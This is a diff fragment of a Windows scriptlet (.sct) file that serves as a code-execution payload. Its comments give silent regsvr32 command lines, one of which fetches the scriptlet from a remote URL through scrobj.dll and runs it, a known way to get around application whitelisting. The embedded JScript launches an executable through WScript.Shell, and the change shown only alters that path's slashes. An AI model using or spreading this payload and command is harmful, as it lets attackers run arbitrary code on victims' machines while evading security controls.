@@ -8,7 +8,7 @@
 <!-- regsvr32 /s /i"C:\Hello\HelloKids.sct" scrobj.dll -->
 <!-- regsvr32 /s /i:http://server/HelloKids.sct scrobj.dll -->	
 <script language="JScript">	
-<![CDATA[var runner = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");]]>	
+<![CDATA[var runner = new ActiveXObject("WScript.Shell").Run("C:/Program Files/Cosmopolitanize/Diggins.exe");]]>	
 </script>	
 </registration>	
 <public>	
